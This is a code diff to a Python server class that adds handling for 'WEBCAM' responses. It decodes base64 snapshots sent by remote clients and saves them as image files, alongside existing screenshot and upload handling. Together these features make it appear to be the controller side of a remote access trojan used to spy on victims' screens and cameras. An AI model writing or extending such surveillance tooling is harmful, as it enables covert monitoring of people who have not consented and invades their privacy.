@@ -165,6 +165,36 @@ class SSLServer:
         except Exception as e:
             print("Screenshot save error:", e)
 
+    def _save_webcam(self, response):
+
+        import base64
+        from datetime import datetime
+
+        try:
+
+            lines = response.split("\n")
+
+            if lines[1] != "OK":
+                print(response)
+
+                return
+
+            encoded = "".join(lines[2:])
+
+            image_bytes = base64.b64decode(encoded)
+
+            filename = "webcam_" f"{datetime.now().timestamp()}.jpg"
+
+            with open(filename, "wb") as f:
+
+                f.write(image_bytes)
+
+            print(f"Webcam snapshot saved: {filename}")
+
+        except Exception as e:
+
+            print("Webcam save error:", e)
+
     def _handle_response(self, response):
         lines = response.split("\n")
         response_type = lines[0]
@@ -180,6 +210,8 @@ class SSLServer:
         elif response_type == "UPLOAD":
             # Just print the upload status
             print("\n".join(lines))
+        elif response_type == "WEBCAM":
+            self._save_webcam(response)
         else:
             print(response)
 
